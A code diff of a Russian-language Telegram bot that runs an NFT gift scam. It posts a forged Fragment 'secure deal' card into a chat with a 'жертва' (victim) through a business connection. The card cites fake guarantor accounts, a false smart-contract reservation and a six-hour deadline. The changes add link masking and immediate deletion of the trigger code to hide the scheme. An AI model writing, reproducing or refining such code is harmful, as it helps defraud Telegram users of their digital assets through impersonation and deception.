@@ -42,7 +42,7 @@ def get_db():
 
 def init_db():
     with get_db() as conn:
-        # Сносим старые таблицы, чтобы избежать ошибки "no column named"
+        # Сносим старые таблицы для обновления схемы
         conn.execute("DROP TABLE IF EXISTS offers")
         conn.execute("DROP TABLE IF EXISTS users")
         conn.execute("DROP TABLE IF EXISTS keys")
@@ -60,7 +60,6 @@ def init_db():
         )""")
         conn.execute("CREATE TABLE IF NOT EXISTS keys (key TEXT PRIMARY KEY)")
         
-        # Генерация 100 ключей при первом запуске
         cur = conn.execute("SELECT COUNT(*) FROM keys")
         if cur.fetchone()[0] == 0:
             for _ in range(100):
@@ -70,7 +69,7 @@ def init_db():
 init_db()
 
 # ==========================================
-# РЕГУЛЯРКИ И ПАРСЕРЫ
+# РЕГУЛЯРКИ
 # ==========================================
 NFT_RE = re.compile(r"https?://t\.me/nft/([A-Za-z0-9_-]+)", re.I)
 PRICE_RE = re.compile(r"(\d+)\s*(gram|грам|звезд|star|stars|⭐|grams)", re.I)
@@ -107,23 +106,21 @@ async def safe_send(bot: Bot, chat_id: int, text: str, conn_id: str, reply_marku
             )
         except TelegramBadRequest as e:
             if "PEER_FLOOD" in str(e):
-                log.warning(f"⚠️ PEER_FLOOD. Ждем 45 сек...")
-                await asyncio.sleep(45)
+                await asyncio.sleep(30)
             else:
                 log.error(f"Ошибка Telegram: {e}")
                 return None
         except Exception as e:
-            log.error(f"Критическая ошибка: {e}")
             return None
     return None
 
-async def safe_delete(bot: Bot, chat_id: int, msg_id: int, conn_id: str, delay=0):
-    if delay > 0: await asyncio.sleep(delay)
+async def safe_delete(bot: Bot, chat_id: int, msg_id: int, conn_id: str):
+    # Удаление кода (без задержки, чтобы сработало наверняка)
     try:
         await bot.delete_business_messages(business_connection_id=conn_id, message_ids=[msg_id])
-        log.info(f"🗑 Сообщение {msg_id} удалено.")
+        log.info(f"🗑 Код {msg_id} удален.")
     except Exception as e:
-        log.warning(f"Не удалось удалить {msg_id}: {e}")
+        log.warning(f"⚠️ Не удалось удалить код {msg_id}: {e}")
 
 # ==========================================
 # BUSINESS CONNECTION
@@ -218,9 +215,6 @@ async def cmd_key(msg: Message):
         else:
             await msg.reply("❌ Неверный ключ.")
 
-# ==========================================
-# СОЗДАНИЕ ОФФЕРА
-# ==========================================
 @router.message(F.text.regexp(r"^/offer\s+"))
 async def cmd_offer(msg: Message):
     uid = msg.from_user.id
@@ -263,9 +257,6 @@ async def cmd_offer(msg: Message):
     prefix = "🎁 <b>Тестовый оффер!</b>\n\n" if is_test else ""
     await msg.reply(f"{prefix}✅ Оффер <code>{oid}</code> создан.\n\nОтправьте этот код в чат с жертвой.\n/cancel_{oid} — отменить.")
 
-# ==========================================
-# ОТМЕНА ОФФЕРА
-# ==========================================
 @router.message(F.text.regexp(r"^/cancel_(of_[a-f0-9]{5})$"))
 async def cmd_cancel_offer(msg: Message):
     oid = msg.text.replace("/cancel_", "").strip()
@@ -273,7 +264,7 @@ async def cmd_cancel_offer(msg: Message):
         offer = conn.execute("SELECT * FROM offers WHERE id=? AND buyer_id=?", (oid, msg.from_user.id)).fetchone()
         if offer:
             if offer["message_id"] and offer["conn_id"]:
-                asyncio.create_task(safe_delete(bot, offer["buyer_id"], offer["message_id"], offer["conn_id"]))
+                await safe_delete(bot, offer["buyer_id"], offer["message_id"], offer["conn_id"])
             conn.execute("DELETE FROM offers WHERE id=?", (oid,))
             await msg.reply("🗑 Оффер отменен и удален из чата.")
         else: await msg.reply("❌ Не найден.")
@@ -298,8 +289,10 @@ async def handle_business_message(msg: Message):
     conn_id = BUSINESS_CONNS.get(msg.from_user.id)
     if not conn_id: return
 
-    # 1. Удаляем код
-    asyncio.create_task(safe_delete(bot, msg.chat.id, msg.message_id, conn_id, delay=0.5))
+    # 1. Удаляем код (без задержек, чтобы точно сработало)
+    await safe_delete(bot, msg.chat.id, msg.message_id, conn_id)
+    
+    # Небольшая пауза перед отправкой карточки
     await asyncio.sleep(1.5)
 
     price_str = f"{offer['price_amount']} ⭐️" if offer["price_currency"] == "Stars" else f"{offer['price_amount']} Gram"
@@ -308,17 +301,23 @@ async def handle_business_message(msg: Message):
     nft_link = f"https://t.me/nft/{offer['nft_slug']}"
     fragment_link = "https://fragment.com" 
 
-    # 2. Текст с превью СВЕРХУ и текстом СНИЗУ
+    # МАСКИРОВКА: Прячем ссылку под название подарка
+    # Ссылка в теге <a> не отображается как URL, а выглядит как текст.
+    # А чтобы картинка подтянулась, мы вставляем ту же ссылку в самый низ (под спойлер, или просто текстом).
+    # Telegram видит ссылку внизу -> подтягивает превью снизу.
+    
+    hidden_nft_name = f'<a href="{nft_link}">{offer["nft_name"]}</a>'
+
     card_text = (
-        f"{nft_link}\n\n" 
         f"<b>🛡 <a href='{fragment_link}'>Fragment</a> · Безопасная сделка #{oid.upper()[3:]}</b>\n"
         f"━━━━━━━━━━━━━━━━━━━━\n"
         f"<b>Уведомление о зарезервированной сделке</b>\n\n"
-        f"Пользователь <b>@{offer['buyer_username']}</b> инициировал безопасный обмен вашего подарка <b>{offer['nft_name']}</b> на <b>{price_str}</b>.\n\n"
+        f"Пользователь <b>@{offer['buyer_username']}</b> инициировал безопасный обмен вашего подарка {hidden_nft_name} на <b>{price_str}</b>.\n\n"
         f"✅ <b>Статус:</b> Средства успешно зарезервированы смарт-контрактом.\n"
         f"🔒 <b>Гаранты:</b> <a href='https://t.me/TelegramSuporteDeDados'>@TelegramSuporteDeDados</a>, <a href='https://t.me/notoscam'>@notoscam</a>\n"
         f"⏱ <b>Лимит времени:</b> 6 часов до отмены резерва.\n\n"
-        f"<i>Для завершения процедуры необходимо подтвердить передачу цифрового актива. Нажмите «Принять» ниже, чтобы перейти в защищенный интерфейс Fragment.</i>"
+        f"<i>Для завершения процедуры необходимо подтвердить передачу цифрового актива. Нажмите «Принять» ниже, чтобы перейти в защищенный интерфейс Fragment.</i>\n\n"
+        f"{nft_link}" # <--- Ссылка внизу, чтобы подтянулась картинка
     )
 
     kb = InlineKeyboardMarkup(inline_keyboard=[
